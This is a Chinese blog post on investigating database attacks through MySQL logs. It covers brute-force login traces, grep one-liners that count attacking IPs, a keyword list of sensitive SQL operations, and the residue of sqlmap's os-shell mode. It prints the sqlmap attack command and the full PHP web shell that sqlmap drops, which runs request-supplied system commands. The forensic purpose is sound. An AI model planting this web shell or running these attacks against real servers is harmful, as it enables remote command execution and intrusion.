
---
title: '【日志分析】MySQL日志分析'
categories: 
 - 编程
 - 掘金
 - 分类
headimg: 'https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c403847efbd44220960f7987c94f1d4d~tplv-k3u1fbpfcp-zoom-1.image'
author: 掘金
comments: false
date: Fri, 09 Jul 2021 02:21:46 GMT
thumbnail: 'https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c403847efbd44220960f7987c94f1d4d~tplv-k3u1fbpfcp-zoom-1.image'
---

<div>   
<div class="markdown-body"><style>.markdown-body&#123;word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#333&#125;.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6&#123;line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px&#125;.markdown-body h1&#123;font-size:30px;margin-bottom:5px&#125;.markdown-body h2&#123;padding-bottom:12px;font-size:24px;border-bottom:1px solid #ececec&#125;.markdown-body h3&#123;font-size:18px;padding-bottom:0&#125;.markdown-body h4&#123;font-size:16px&#125;.markdown-body h5&#123;font-size:15px&#125;.markdown-body h6&#123;margin-top:5px&#125;.markdown-body p&#123;line-height:inherit;margin-top:22px;margin-bottom:22px&#125;.markdown-body img&#123;max-width:100%&#125;.markdown-body hr&#123;border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px&#125;.markdown-body code&#123;word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em&#125;.markdown-body code,.markdown-body pre&#123;font-family:Menlo,Monaco,Consolas,Courier New,monospace&#125;.markdown-body pre&#123;overflow:auto;position:relative;line-height:1.75&#125;.markdown-body pre>code&#123;font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8&#125;.markdown-body a&#123;text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff&#125;.markdown-body a:active,.markdown-body a:hover&#123;color:#275b8c&#125;.markdown-body table&#123;display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6&#125;.markdown-body thead&#123;background:#f6f6f6;color:#000;text-align:left&#125;.markdown-body tr:nth-child(2n)&#123;background-color:#fcfcfc&#125;.markdown-body td,.markdown-body th&#123;padding:12px 7px;line-height:24px&#125;.markdown-body td&#123;min-width:120px&#125;.markdown-body blockquote&#123;color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8&#125;.markdown-body blockquote:after&#123;display:block;content:""&#125;.markdown-body blockquote>p&#123;margin:10px 0&#125;.markdown-body ol,.markdown-body ul&#123;padding-left:28px&#125;.markdown-body ol li,.markdown-body ul li&#123;margin-bottom:0;list-style:inherit&#125;.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item&#123;list-style:none&#125;.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul&#123;margin-top:0&#125;.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul&#123;margin-top:3px&#125;.markdown-body ol li&#123;padding-left:6px&#125;.markdown-body .contains-task-list&#123;padding-left:0&#125;.markdown-body .task-list-item&#123;list-style:none&#125;@media (max-width:720px)&#123;.markdown-body h1&#123;font-size:24px&#125;.markdown-body h2&#123;font-size:20px&#125;.markdown-body h3&#123;font-size:18px&#125;&#125;</style><p>常见的数据库攻击包括弱口令、SQL注入、提升权限、窃取备份等。对数据库日志进行分析，可以发现攻击行为，进一步还原攻击场景及追溯攻击源。</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c403847efbd44220960f7987c94f1d4d~tplv-k3u1fbpfcp-zoom-1.image" alt loading="lazy" referrerpolicy="no-referrer"></p>
<h1 data-id="heading-0">0x01 Mysql日志分析</h1>
<p>general query log能记录成功连接和每次执行的查询，我们可以将它用作安全布防的一部分，为故障分析或黑客事件后的调查提供依据。</p>
<pre><code class="copyable">1、查看log配置信息
show variables like '%general%';
2、开启日志
SET GLOBAL general_log = 'On';
3、指定日志文件路径
#SET GLOBAL general_log_file = '/var/lib/mysql/mysql.log';
<span class="copy-code-btn">复制代码</span></code></pre>
<p>比如，当我访问 /test.php?id=1，此时我们得到这样的日志：</p>
<pre><code class="copyable">190604 14:46:14       14 Connect    root@localhost on 
           14 Init DB    test
           14 Query    SELECT * FROM admin WHERE id = 1
           14 Quit  `
<span class="copy-code-btn">复制代码</span></code></pre>
<p>我们按列来解析一下：</p>
<pre><code class="copyable">第一列:Time，时间列，前面一个是日期,后面一个是小时和分钟，有一些不显示的原因是因为这些sql语句几乎是同时执行的,所以就不另外记录时间了。
第二列:Id，就是show processlist出来的第一列的线程ID,对于长连接和一些比较耗时的sql语句,你可以精确找出究竟是那一条那一个线程在运行。
第三列:Command，操作类型，比如Connect就是连接数据库，Query就是查询数据库(增删查改都显示为查询)，可以特定过虑一些操作。
第四列:Argument，详细信息，例如 Connect    root@localhost on 意思就是连接数据库，如此类推,接下面的连上数据库之后,做了什么查询的操作。
<span class="copy-code-btn">复制代码</span></code></pre>
<h1 data-id="heading-1">0x02 登录成功/失败</h1>
<p>我们来做个简单的测试吧，使用我以前自己开发的弱口令工具来扫一下，字典设置比较小，2个用户，4个密码，共8组。</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/a483973b39d04012b8fcdc522b344d9f~tplv-k3u1fbpfcp-zoom-1.image" alt loading="lazy" referrerpolicy="no-referrer"></p>
<p>MySQL中的log记录是这样子：</p>
<pre><code class="copyable">Time                 Id        Command         Argument

190601 22:03:20   98 Connectroot@192.168.204.1 on 
   98 ConnectAccess denied for user 'root'@'192.168.204.1' (using password: YES)
  103 Connectmysql@192.168.204.1 on 
  103 ConnectAccess denied for user 'mysql'@'192.168.204.1' (using password: YES)
  104 Connectmysql@192.168.204.1 on 
  104 ConnectAccess denied for user 'mysql'@'192.168.204.1' (using password: YES)
  100 Connectroot@192.168.204.1 on 
  101 Connectroot@192.168.204.1 on 
  101 ConnectAccess denied for user 'root'@'192.168.204.1' (using password: YES)
   99 Connectroot@192.168.204.1 on 
   99 ConnectAccess denied for user 'root'@'192.168.204.1' (using password: YES)
  105 Connectmysql@192.168.204.1 on 
  105 ConnectAccess denied for user 'mysql'@'192.168.204.1' (using password: YES)
  100 Queryset autocommit=0
  102 Connectmysql@192.168.204.1 on 
  102 ConnectAccess denied for user 'mysql'@'192.168.204.1' (using password: YES)
  100 Quit`
<span class="copy-code-btn">复制代码</span></code></pre>
<p>你知道在这个口令猜解过程中，哪个是成功的吗？</p>
<p>利用爆破工具，一个口令猜解成功的记录是这样子的：</p>
<pre><code class="copyable">190601 22:03:20     100 Connectroot@192.168.204.1 on 
   100 Queryset autocommit=0
   100 Quit
<span class="copy-code-btn">复制代码</span></code></pre>
<p>但是，如果你是用其他方式，可能会有一点点不一样的哦。</p>
<p>Navicat for MySQL登录：</p>
<pre><code class="copyable">190601 22:14:07  106 Connectroot@192.168.204.1 on 
         106 QuerySET NAMES utf8
         106 QuerySHOW VARIABLES LIKE 'lower_case_%'
         106 QuerySHOW VARIABLES LIKE 'profiling'
         106 QuerySHOW DATABASES
<span class="copy-code-btn">复制代码</span></code></pre>
<p>命令行登录：</p>
<pre><code class="copyable">190601 22:17:25  111 Connectroot@localhost on 
         111 Queryselect @@version_comment limit 1
190601 22:17:56  111 Quit
<span class="copy-code-btn">复制代码</span></code></pre>
<p>这个差别在于，不同的数据库连接工具，它在连接数据库初始化的过程中是不同的。通过这样的差别，我们可以简单判断出用户是通过连接数据库的方式。</p>
<p>另外，不管你是爆破工具、Navicat for MySQL、还是命令行，登录失败都是一样的记录。</p>
<p>登录失败的记录：</p>
<pre><code class="copyable">102 Connectmysql@192.168.204.1 on 
102 ConnectAccess denied for user 'mysql'@'192.168.204.1' (using password: YES)
<span class="copy-code-btn">复制代码</span></code></pre>
<p>利用shell命令进行简单的分析：</p>
<pre><code class="copyable">#有哪些IP在爆破？
grep  "Access denied" mysql.log |cut -d "'" -f4|uniq -c|sort -nr
     27 192.168.204.1

#爆破用户名字典都有哪些？
grep  "Access denied" mysql.log |cut -d "'" -f2|uniq -c|sort -nr
     13 mysql
     12 root
      1 root
      1 mysql
<span class="copy-code-btn">复制代码</span></code></pre>
<p>在日志分析中，特别需要注意一些敏感的操作行为，比如删表、备库，读写文件等。关键词：drop table、drop function、lock tables、unlock tables、load_file() 、into outfile、into dumpfile。</p>
<p>敏感数据库表：SELECT * from mysql.user、SELECT * from mysql.func</p>
<h1 data-id="heading-2">0x03 SQL注入入侵痕迹</h1>
<p>在利用SQL注入漏洞的过程中，我们会尝试利用sqlmap的--os-shell参数取得shell，如操作不慎，可能留下一些sqlmap创建的临时表和自定义函数。我们先来看一下sqlmap os-shell参数的用法以及原理：</p>
<p>1、构造一个SQL注入点，开启Burp监听8080端口</p>
<pre><code class="copyable">sqlmap.py  -u http://192.168.204.164/sql.php?id=1 --os-shell --proxy=http://127.0.0.1:8080`
<span class="copy-code-btn">复制代码</span></code></pre>
<p>HTTP通讯过程如下：</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/ece04a099dc54f4d80aace372cf9c4ee~tplv-k3u1fbpfcp-zoom-1.image" alt loading="lazy" referrerpolicy="no-referrer"></p>
<p>创建了一个临时文件tmpbwyov.php，通过访问这个木马执行系统命令，并返回到页面展示。</p>
<p>tmpbwyov.php：</p>
<pre><code class="copyable"><?php $c=$_REQUEST["cmd"];@set_time_limit(0);@ignore_user_abort(1);
@ini_set('max_execution_time',0);$z=@ini_get('disable_functions');
if(!empty($z))&#123;$z=preg_replace('/[, ]+/',',',$z);
$z=explode(',',$z);$z=array_map('trim',$z);&#125;
else&#123;$z=array();&#125;$c=$c." 2>&1\n";function f($n)
&#123;global $z;return is_callable($n)and!in_array($n,$z);&#125;
if(f('system'))&#123;ob_start();system($c);$w=ob_get_contents();ob_end_clean();&#125;
elseif(f('proc_open'))
&#123;$y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t);$w=NULL;
while(!feof($t[1]))&#123;$w.=fread($t[1],512);&#125;@proc_close($y);&#125;
elseif(f('shell_exec'))
&#123;$w=shell_exec($c);&#125;elseif(f('passthru'))
&#123;ob_start();passthru($c);$w=ob_get_contents();ob_end_clean();&#125;
elseif(f('popen'))&#123;$x=popen($c,r);$w=NULL;if(is_resource($x))
&#123;while(!feof($x))&#123;$w.=fread($x,512);&#125;&#125;@pclose($x);&#125;elseif(f('exec'))
&#123;$w=array();exec($c,$w);$w=join(chr(10),$w).chr(10);&#125;else&#123;$w=0;&#125;
print "<pre>".$w."</pre>";?>`
<span class="copy-code-btn">复制代码</span></code></pre>
<p>创建了一个临时表sqlmapoutput，调用存储过程执行系统命令将数据写入临时表，然后取临时表中的数据展示到前端。</p>
<p>通过查看网站目录中最近新建的可疑文件，可以判断是否发生过sql注入漏洞攻击事件。</p>
<p>检查方法：</p>
<p>1、检查网站目录下，是否存在一些木马文件：</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/0eec06737a084df6a3ad21572f6ef90d~tplv-k3u1fbpfcp-zoom-1.image" alt loading="lazy" referrerpolicy="no-referrer"></p>
<p>2、检查是否有UDF提权、MOF提权痕迹</p>
<p>检查目录是否有异常文件</p>
<p>mysql\lib\plugin</p>
<p>c:/windows/system32/wbem/mof/</p>
<p>检查函数是否删除</p>
<p>select * from mysql.func</p>
<p>3、结合web日志分析。</p>
<p><strong>好啦，日志分析系列文章已更新完毕，下周为大家分享《Linux实战篇》，欢迎关注+点赞~</strong></p></div>  
</div>
            